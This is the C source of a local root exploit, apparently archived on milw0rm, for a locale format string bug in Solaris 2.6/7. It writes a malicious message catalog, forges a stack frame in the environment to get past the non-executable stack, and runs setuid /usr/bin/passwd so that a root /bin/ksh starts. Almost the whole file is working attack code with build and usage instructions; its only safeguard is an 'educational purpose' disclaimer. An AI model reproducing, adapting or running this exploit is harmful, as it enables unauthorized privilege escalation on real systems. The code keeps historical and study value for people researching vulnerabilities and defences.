/*
 * exploit for locale subsystem format strings bug In Solaris with noexec stack.
 * Tested in Solaris 2.6/7.0 (If it wont work, try adjust retloc offset. e.g. 
 * ./ex -o -4 )
 *
 * $gcc -o ex ex.c `ldd /usr/bin/passwd|sed -e 's/^.lib\([_0-9a-zA-Z]*\)\.so.*/-l\1/'`
 * usages: ./ex -h
 *
 * Thanks for Ivan Arce <iarce@core-sdi.com> who found this bug.
 * Thanks for horizon's great article about defeating noexec stack for Solaris.
 *
 * THIS CODE IS FOR EDUCATIONAL PURPOSE ONLY AND SHOULD NOT BE RUN IN
 * ANY HOST WITHOUT PERMISSION FROM THE SYSTEM ADMINISTRATOR.
 *
 *     by warning3@nsfocus.com (http://www.nsfocus.com)
 *             y2k/11/10
 */

#include <stdio.h>
#include <unistd.h>
#include <sys/systeminfo.h>
#include <fcntl.h>
#include <dlfcn.h>

#define BUFSIZE 2048			/* the size of format string buffer	*/
#define BUFF    128			/* the progname buffer size		*/
#define SHELL   "/bin/ksh"		/* shell name				*/
#define DEFAULT_NUM 68			/* format strings number		*/
#define DEFAULT_RETLOC 0xffbefb44	/* default retloc address		*/
#define VULPROG  "/usr/bin/passwd"	/* vulnerable program name		*/

void usages(char *progname)
{
  int i;
  printf("Usage: %s \n", progname);
  printf("    [-h]       Help menu\n");
  printf("    [-n number]      format string's number\n");
  printf("    [-a align]       retloc buffer alignment\n");
  printf("    [-o offset]      retloc offset\n\n");

}

/* get current stack point address to guess Return address */
long get_sp(void)
{
  __asm__("mov %sp,%i0");
}

main( int argc, char **argv )
{
  char *pattern, retlocbuf[BUFF], *env[11];
  char plat[BUFF], *ptr;
  long sh_addr, sp_addr, i;
  long retloc = DEFAULT_RETLOC, num = DEFAULT_NUM,  align = 0, offset=0;
  long  *addrptr;
  long reth, retl, reth1, retl1;
  FILE *fp;
  

  extern int optind, opterr;
  extern char *optarg;
  int opt;

  void *handle;
  long execl_addr, fp_addr, fp1_addr;
  char fakeframe[512];
  char padding[64], pad = 0;
  int env_len, arg_len, len;

  char progname[BUFF];
  strncpy(progname, argv[0], BUFF-1);

  while ((opt = getopt(argc, argv, "n:a:o:h")) != -1)
    switch((char)opt)
    {

      case 'n':
        num = atoi(optarg);
        break;

      case 'a':
        align = atoi(optarg);
        break;
      case 'o':
        offset = atoi(optarg);
        break;
      case '?':
      case 'h':
      default:
        usages(progname);
        exit(0);
    }

  retloc +=  offset;
  
  /* get platform info  */
  sysinfo(SI_PLATFORM,plat,256);

  /* Construct fake frame in environ */
  
  env[0] = "NLSPATH=:.";
  env[1] = padding;      /* padding so that fakeframe's address can be divided by 4 */
  /* sh_addr|sh_addr|0x00000000|fp2|fp2|fp2|fp2|fp2|0x00|/bin/ksh|0x00 */
  env[2]=(fakeframe);     /* sh_addr|sh_addr|0x00           */
  env[3]=&(fakeframe[40]);/*         |0x00      */
  env[4]=&(fakeframe[40]);/*        |0x00       */
  env[5]=&(fakeframe[40]);/*             |0x00  */
  env[6]=&(fakeframe[44]);/*            |fp2|fp2|fp2|fp2|fp2*/
  env[7]=SHELL;     /* shell strings */
  env[8]=NULL;

  /* calculate the length of "VULPROG" + argv[1] */
  arg_len = strlen(VULPROG) + strlen("-z") + 2;

  /* calculate the pad nummber .
   * We manage to let the length of padding + arg_len + "NLSPATH=." can
   * be divided by 4. So fakeframe address is aligned with 4, otherwise
   * the exploit won't work.
   */
  pad = 3 - (arg_len + strlen(env[0]) +1)%4;
  memset(padding, 'A', pad);
  padding[pad] = '\0';

  /* get environ length */
  env_len = 0; 
  for(i = 0 ; i < 8 ; i++ )
    env_len += strlen(env[i]) + 1;

 /* get the length from argv[0] to stack bottom 
  *                  
  * +------------------------+-----------+--------+-----------+--------+
  * |argv[0]argv[1]...argv[n]|env0...envn|platform|programname|00000000|
  * +------------------------+-----------+--------+-----------+--------+
  * ^               ^ 
  * |__startaddr                |__sp_addr 
  *
  * "sp_addr" = 0xffbefffc(Solaris 7/8) or 0xeffffffc(Solaris 2.6)
  *
  *  I find "startaddr" always can be divided by 4.
  *  So we can adjust the padding's size to let the fakeframe address
  *  can be aligned with 4.
  *
  * len = length of "argv" + "env" + "platform" + "program name" 
  * if (len%4)!=0, sp_addr - startaddr =  (len/4)*4 + 4
  * if (len%4)==0, sp_addr - startaddr =  len
  * So we can get every entry's address precisely based on startaddr or sp_addr.
  * Now we won't be bored with guessing the alignment and offset.:)
  */
  len = arg_len + env_len + strlen(plat) + 1 
  + strlen(VULPROG) + 1;
  printf("len = %#x\n", len);

  /* get stack bottom address */

  sp_addr = (get_sp() | 0xffff) & 0xfffffffc;

  /* fp1_addr must be valid stack address */
  fp1_addr = (sp_addr & 0xfffffac0);

  /* get shell string address */
  sh_addr =  sp_addr - (4 - len%4) /* the trailing zero number */
         - strlen(VULPROG) - strlen(plat)  - strlen(SHELL) - 3 ;

   printf("SHELL address = %#x\n", sh_addr);
   
  /* get our fake frame address */
  fp_addr = sh_addr - 8*8 - 1;

  /* get execl() address */
  if (!(handle=dlopen(NULL,RTLD_LAZY)))
  {            
    fprintf(stderr,"Can't dlopen myself.\n");
    exit(1);
  }
  if ((execl_addr=(long)dlsym(handle,"execl"))==NULL)
  {
    fprintf(stderr,"Can't find execl().\n");
    exit(1);
  }           
    
  /* dec 4 to skip the 'save' instructure */
  execl_addr -= 4;
  
  /* check if the exec addr includes zero  */
  if (!(execl_addr & 0xff) || !(execl_addr * 0xff00) ||
    !(execl_addr & 0xff0000) || !(execl_addr & 0xff000000))
  {
    fprintf(stderr,"the address of execl() contains a '0'. sorry.\n");
    exit(1);
  }

  printf("Using execl() address : %#x\n",execl_addr);

  /* now we set up our fake stack frame */

  addrptr=(long *)fakeframe;

  *addrptr++= 0x12345678; /* you can put any data in  local registers */
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;
  *addrptr++= 0x12345678;

  *addrptr++=sh_addr;      /* points to our string to exec */
  *addrptr++=sh_addr;      /* argv[1] is a copy of argv[0] */
  *addrptr++=0x0;    /* NULL for execl();  &fakeframe[40] */
  *addrptr++=fp1_addr;     /* &fakeframe[44] */
  *addrptr++=fp1_addr;
  *addrptr++=fp1_addr;
  *addrptr++=fp1_addr;     /* we need this address to work  */
  *addrptr++=fp1_addr; /* cause we don't need exec another func,so put garbage here */
  *addrptr++=0x0;

  /* get correct retloc in solaris 2.6(0xefffxxxx) and solaris 7/8 (0xffbexxxx) */
  retloc = (get_sp()&0xffff0000) + (retloc & 0x0000ffff);

  printf("Using RETloc address = 0x%x,  fp_addr = 0x%x  ,align= %d\n", retloc, fp_addr, align );

  /* Let's make reloc buffer: |AAAA|retloc-4|AAAA|retloc-2|AAAA|retloc|AAAA|retloc+2|*/

  addrptr = (long *)retlocbuf;

  for( i = 0 ; i < 8 ; i ++ )
    *(addrptr + i) = 0x41414141;
    *(addrptr + 1) = retloc - 4;
    *(addrptr + 3) = retloc - 2;
    *(addrptr + 5) = retloc ;
    *(addrptr + 7) = retloc + 2;

  if((pattern = (char *)malloc(BUFSIZE)) == NULL) {
    printf("Can't get enough memory!\n");
    exit(-1);
  }

  /* Let's make formats string buffer: 
   * |A..AAAAAAAAAAAA|%.8x....|%(fp1)c%hn%(fp2)%hn%(execl1)c%hn%(execl2)%hn|  
   */
  ptr = pattern;
  memset(ptr, 'A', 32);
  ptr += 32;

  for(i = 0 ; i < num ; i++ ){
    memcpy(ptr, "%.8x", 4);
    ptr += 4;
  }

  reth = (fp_addr >> 16) & 0xffff ;
  retl = (fp_addr >>  0) & 0xffff ;
  reth1 = (execl_addr >> 16) & 0xffff ;
  retl1 = (execl_addr >>  0) & 0xffff ;
  

  /* Big endian arch */
  sprintf(ptr, "%%%uc%%hn%%%uc%%hn%%%uc%%hn%%%uc%%hn",
         (reth - num*8 -4*8 + align ), (0x10000 +  retl - reth),
         (0x20000 + reth1 - retl), (0x30000 + retl1 - reth1));

  if( !(fp = fopen("messages.po", "w+")))
  {
    perror("fopen");
    exit(1);
  }
  fprintf(fp,"domain \"messages\"\n");
  fprintf(fp,"msgid  \"%%s: illegal option -- %%c\\n\"\n");
  fprintf(fp,"msgstr \"%s\\n\"", pattern + align);
  fclose(fp);
  system("/usr/bin/msgfmt -o SUNW_OST_OSLIB messages.po");

  /* thanks for z33d's idea. 
   * It seems we have to do like this in Solaris 8.
   */
  i=open("./SUNW_OST_OSLIB",O_RDWR);
  /* locate the start position of formats strings in binary file*/
  lseek(i, 62, SEEK_SET);
  /* replace the start bytes with our retlocbuf */
  write(i, retlocbuf + align, 32 - align);
  close(i);

  execle(VULPROG, VULPROG, "-z", NULL, env);
}


// milw0rm.com [2000-11-30]
